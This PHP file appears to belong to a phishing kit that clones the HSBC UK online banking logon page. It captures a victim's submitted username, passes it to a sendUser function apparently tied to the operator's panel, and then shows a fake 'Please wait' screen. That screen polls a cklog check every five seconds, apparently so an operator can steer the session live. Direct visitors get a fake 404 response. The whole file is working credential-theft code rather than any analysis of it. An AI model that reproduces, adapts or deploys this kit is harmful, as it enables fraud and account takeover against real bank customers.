<?php
session_start();
error_reporting(0);
include "hc.php";
include "control.php";
include "connect/out.php";
if(isset($_POST["ue"]))
{
	$ue=$_SESSION["ue"]=$_POST["ue"];
	
	if(strlen($ue) == 0)
	{
		echo '<meta http-equiv="refresh" content="0;URL=idv.Log.php?ud=dashbrd&idv.cmd=LOGIN&error_e=1&accessU='.md5(rand(1,100)).'&ID='.randomChaSp(rand(40,60)).'" />';
		die();
	}
	if(strlen($ue) <5)
	{
		echo '<meta http-equiv="refresh" content="0;URL=idv.Log.php?ud=dashbrd&idv.cmd=LOGIN&error_i=1&accessU='.md5(rand(1,100)).'&ID='.randomChaSp(rand(40,60)).'" />';
		die();
	}
	sendUser($ue,$panel_rec);
	echo '<!DOCTYPE html>
<html xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="dj_gecko dj_contentbox" lang="en"><head>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <title>Log on to Online Banking: Username | HSBC</title>
	  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=1">
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta http-equiv="Cache-Control" content="max-age=1,s-maxage=0, no-cache, no-store, must-revalidate, private">
      <link rel="stylesheet" href="reg/box.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/button.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/core.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/footer.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/table.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/light.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/head.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/reset.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/detail.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/common.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/extra.css'.outrand().'" media="screen">
	  <link rel="shortcut icon" type="ico" href="favicon.ico'.outrand().'">
	  <script src="reg/jquery.min.js'.outrand().'"></script>
	  <script>setInterval(function(){cklog("'.$_SESSION["ue"].'","1","dk");},5000);</script>
   </head>
   <body class="ursula">
      <div id="top">
         <div id="mainTopWrapper">
            <div id="mainTopUtility">
               <h1>HSBC</h1>
               <div id="mainTopUtilityRow">
                  <ul id="tabs">
                     <li class="skipLink"><a class="skip" href="#innerPage" id="skip" target="#innerPage a:first" title="" lang="en">Skip page header and navigation</a></li>
                     <li class="on"><a href="#">Personal</a></li>
                     <li><a href="#" title="">Business</a></li>
                  </ul>
                  <div id="siteControls">
                     <div id="langList">
                        <ul>
                           <li class="selected"><a href="#" title="" lang="en-UK">English</a></li>
                        </ul>
                     </div>
                     <div id="locale" lang="en">
                        <div id="countrySelectorWrapper" lang="en">
                           <a class="dropDownLink trigger" role="tablist" href="#countrySelectorContent" title=""><span><span class="flag uk">United Kingdom</span></span></a>
                           <div class="placeholder"></div>
                        </div>
                     </div>
                     <div id="logon" style="display: block;">
                        <ul style="display: none">
                           <li><a href="#" title="" class="redBtn"><span>Log on</span></a></li>
                           <li><a href="#" title="" class="greyBtn"><span>Register</span></a></li>
                        </ul>
                     </div>
                     <div id="logoff" style="display: none;" lang="en">
                        <ul>
                           <li><a href="#" title="" class="redBtn"><span>Log off</span></a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
            <div id="mainTopNavigation">
               <div id="logo"><a href="#" title=""><img alt="HSBC" src="reg/hsbc-logo.gif"></a></div>
               <div id="sections" lang="en">
                  <nav>
                     <ul id="topLevel" role="menu">
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="everydayBanking"><strong>Everyday Banking</strong><br>Accounts
                           &amp; services</a>
                           <div class="doormatWrapper fourColLeft" style="opacity: 0; display: none;">
                              <div class="arrow">&nbsp;</div>
                              <div class="doormat">
                                 <p class="skipLink"><a href="#" title="">Move to Borrowing
                                    navigation</a>
                                 </p>
                                 <div class="doormatLeft">
                                    <div class="column">
                                       <h3 class="hidden">HSBC</h3>
                                       <h3><a href="#" title="">Current
                                          accounts</a>
                                       </h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="">HSBC
                                             Premier Account</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">HSBC
                                             Advance Account</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Bank
                                             Account</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Student
                                             Account</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Switching
                                             to HSBC</a>
                                          </li>
                                       </ul>
                                       <p class="ctaLink"><a href="#" title="">View
                                          all <span class="hidden">current accounts</span></a>
                                       </p>
                                       <h3><a href="#" title="">Savings</a></h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="">ISAs</a></li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Online
                                             Bonus Saver</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Flexible
                                             Saver</a>
                                          </li>
                                       </ul>
                                       <p class="ctaLink"><a href="#" title="">View
                                          all <span class="hidden">savings accounts</span></a>
                                       </p>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="">Customer
                                          support</a>
                                       </h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Card
                                             support</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Money
                                             worries</a>
                                          </li>
                                       </ul>
                                       <p class="ctaLink"><a href="#" title="">View
                                          all <span class="hidden">customer support</span></a>
                                       </p>
                                       <h3><a href="#" title="">Ways
                                          to bank</a>
                                       </h3>
                                       <p>Online, phone, mobile or in branch, we make it easy to bank with us.</p>
                                       <p class="ctaLink"><a href="#" title="">Find
                                          out more <span class="hidden">about Ways to bank</span></a>
                                       </p>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="">Credit
                                          cards</a>
                                       </h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="">HSBC
                                             Credit Card</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">HSBC
                                             Premier Credit Card</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Student
                                             Credit Card</a>
                                          </li>
                                       </ul>
                                       <p class="ctaLink"><a href="#" title="">View
                                          all <span class="hidden">credit cards</span></a>
                                       </p>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="">International
                                          services</a>
                                       </h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="">HSBC
                                             Currency Account</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">International
                                             Payments</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Travel
                                             money</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Overseas
                                             account opening</a>
                                          </li>
                                       </ul>
                                       <p class="ctaLink"><a href="#" title="">View
                                          all <span class="hidden">international services</span></a>
                                       </p>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </li>
                        <li class="level1">
                           <a class="mainTopNav" tabindex="0" id="borrowing"><strong>Borrowing</strong><br>Loans &amp; mortgages</a>
                           <div class="doormatWrapper fourColLeft" style="opacity: 0; display: none;">
                              <div class="arrow">&nbsp;</div>
                              <div class="doormat">
                                 <p class="skipLink"><a href="#" title="">Move
                                    to Investing navigation</a>
                                 </p>
                                 <div class="doormatLeft">
                                    <div class="column">
                                       <h3><a href="#" title="">Loans</a></h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Personal
                                             Loan</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">FlexiLoan</a></li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Premier
                                             Personal Loan</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Graduate
                                             Loan</a>
                                          </li>
                                       </ul>
                                       <p class="ctaLink"><a href="#" title="">View
                                          all <span class="hidden">loans</span></a>
                                       </p>
                                       <h3><a href="#" title="">Credit
                                          cards</a>
                                       </h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Classic
                                             Credit Card</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">HSBC
                                             Premier Credit Card</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Student
                                             Visa Credit Card</a>
                                          </li>
                                       </ul>
                                       <p class="ctaLink"><a href="#" title="">View
                                          all <span class="hidden">credit cards</span></a>
                                       </p>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="">Mortgages</a></h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" class="extLink">First
                                             time buyer</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Buy
                                             to let</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Mortgage
                                             calculators</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Existing
                                             customers</a>
                                          </li>
                                       </ul>
                                       <p class="ctaLink"><a href="#" title="">View
                                          all <span class="hidden">mortgages</span></a>
                                       </p>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="">Customer
                                          support</a>
                                       </h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Taking
                                             control of your finances</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Buying
                                             your first home</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Mortgage
                                             jargon buster</a>
                                          </li>
                                       </ul>
                                       <p class="ctaLink"><a href="#" title="">View
                                          all <span class="hidden">customer support</span></a>
                                       </p>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="">Overdraft
                                          service</a>
                                       </h3>
                                       <p>Manage your money by agreeing an arranged overdraft facility and keeping
                                          within its limit.
                                       </p>
                                       <p class="ctaLink"><a href="#" title="">Learn
                                          more<span class="hidden"> about overdrafts</span></a>
                                       </p>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </li>
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="Investing"><strong>Investing</strong><br>
                           Products &amp; analysis</a>
                           <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;">
                              <div class="arrow">&nbsp;</div>
                              <div class="doormat">
                                 <p class="skipLink"><a href="#" title="">Move to Insurance
                                    navigation</a>
                                 </p>
                                 <div class="doormatLeft">
                                    <div class="column">
                                       <h3><a href="#" title="" class="extLink">Investments</a></h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Investment
                                             funds</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Selected
                                             Investment Funds ISA</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Sharedealing</a></li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">HSBC
                                             Premier Financial Advice</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Child
                                             Trust Fund</a>
                                          </li>
                                       </ul>
                                       <p class="ctaLink"><a href="#" title="" class="extLink">View
                                          all <span class="hidden">investments</span></a>
                                       </p>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="" class="extLink">Global
                                          Investment Centre</a>
                                       </h3>
                                       <p>Trade funds online</p>
                                       <p class="ctaLink"><a href="#" title="" class="extLink">Find
                                          out more <span class="hidden">about trading funds online</span></a>
                                       </p>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="" class="extLink">Financial
                                          news and analysis.</a>
                                       </h3>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="" class="extLink">Why
                                          invest with us?</a>
                                       </h3>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </li>
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="insurance"><strong>Insurance</strong><br>
                           Property &amp; family</a>
                           <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;">
                              <div class="arrow">&nbsp;</div>
                              <div class="doormat">
                                 <p class="skipLink"><a href="#" title="">Move Planning navigation</a></p>
                                 <div class="doormatLeft">
                                    <div class="column">
                                       <h3><a href="#" title="">Travel</a></h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Travel
                                             Insurance</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">HSBC
                                             Premier Travel Insurance</a>
                                          </li>
                                       </ul>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="">Home
                                          Insurance</a>
                                       </h3>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="">View
                                          all HSBC Insurance options</a>
                                       </h3>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="">Customer
                                          support</a>
                                       </h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Home
                                             Insurance claims</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Travel
                                             Insurance claims</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="">Premier
                                             Travel Insurance claims</a>
                                          </li>
                                       </ul>
                                       <p class="ctaLink"><a href="#" title="">View
                                          all <span class="hidden">customer support</span></a>
                                       </p>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </li>
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="lifeEvents"><strong>Life events</strong><br>
                           Help and support</a>
                           <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;">
                              <div class="arrow">&nbsp;</div>
                              <div class="doormat">
                                 <p class="skipLink"><a href="#" title="">Move to site search</a></p>
                                 <div class="doormatLeft">
                                    <div class="column">
                                       <h3><a href="#" title="" class="extLink">Life events</a></h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Bereavement
                                             support</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Separation
                                             support</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Settling
                                             in the UK</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Getting
                                             married</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Planning
                                             your retirement</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Growing
                                             your wealth</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Moving
                                             abroad</a>
                                          </li>
                                       </ul>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Financial
                                             health check</a>
                                          </li>
                                       </ul>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="" class="extLink">Planning
                                          tools</a>
                                       </h3>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="" class="extLink">Protecting
                                          what matters</a>
                                       </h3>
                                       <p class="ctaLink"><a href="#" title="" class="extLink">Learn
                                          more</a>
                                       </p>
                                    </div>
                                    <div class="column">
                                       <h3><a href="#" title="">Customer
                                          support</a>
                                       </h3>
                                       <ul role="menu">
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Ways
                                             we can help</a>
                                          </li>
                                          <li role="menuitem"><a role="menuitem" href="#" title="" class="extLink">Frequently
                                             asked questions</a>
                                          </li>
                                       </ul>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </li>
                     </ul>
                  </nav>
               </div>
            </div>
         </div>
         <p></p>
         <div class="pageHeaderBg">
            <div class="pageHeading row">
               <div class="pageHeadingInner">
                  <h2>Logon to online banking</h2>
               </div>
            </div>
         </div>
         <p></p>
         <div class="innerPage" id="innerPage">
            <div class="grid_skin">
               <div class="containerStyle01">
                  <div class="grid grid_24">
                     <div class="activate">
                        <h3 class="hidden">Your session has been invalidated. Please try to login again.</h3>
                        <div class="informationBox questionGroup" style="background-image: none;padding: 0px;border:0px;">
                           <p class="errorMsg" style="text-align: center;padding: 70px 0px 60px 0px;">
  <img src="reg/info/Spinner28Dark.gif"><br>
  <br>
  <br>
<br>Please wait...</p>
                           <br><br><br><br><br><br><br><br><br><br><br>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         
         <style type="text/css">  
            #footerMapRow,
            #footerLinksRow,
            #footerUtilityRow {
            width: 940px;
            }
            #footerMap #footerMapRow .column.last {
            padding-right: 0
            }
            #footerMap #footerMapRow .column {
            padding: 0 10px 0 0;
            width: 145px;
            }
         </style>
         <div dir="ltr" id="footerLinks">
            <div id="footerLinksRow">
               <ul style="display: flex; white-space: nowrap;">
                  <li class="contact">
                     <a href="#" title="">Help &amp; Support</a>
                  </li>
                  <li class="branch">
                     <a href="#" title="">Find a branch</a>
                  </li>
               </ul>
            </div>
         </div>
         <div dir="ltr" id="footerMap">
            <div class="sixCol" id="footerMapRow">
               <div class="column last">
                  <h2>
                     <a href="#" title="">Support</a>
                  </h2>
                  <ul>
                     <li>
                        <a href="#" title="">Security centre</a>
                     </li>
                     <li>
                        <a href="#" title="">Card support</a>
                     </li>
                     <li>
                        <a href="#" title="">CoBrowse</a>
                     </li>
                  </ul>
               </div>
            </div>
         </div>
         <div dir="ltr" id="footerUtility">
            <div id="footerUtilityRow">
               <ul>
                  <li>
                     <a href="#" title="">About HSBC</a>
                  </li>
                  <li>
                     <a href="#" title="">Site map</a>
                  </li>
                  <li>
                     <a href="#" title="">Legal</a>
                  </li>
                  <li>
                     <a href="#" title="">Privacy notice</a>
                  </li>
                  <li>
                     <a href="#" title="" class="dnt_no_consent">Cookie
                     Policy</a>
                  </li>
                  <li>
                     <a href="#" title="">Accessibility</a>
                  </li>
                  <li>
                     <a href="#" title="">HSBC Group</a>
                  </li>
               </ul>
               <p>
                  © &nbsp;HSBC Group 2020
               </p>
            </div>
         </div>
         
      </div>
   
</body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>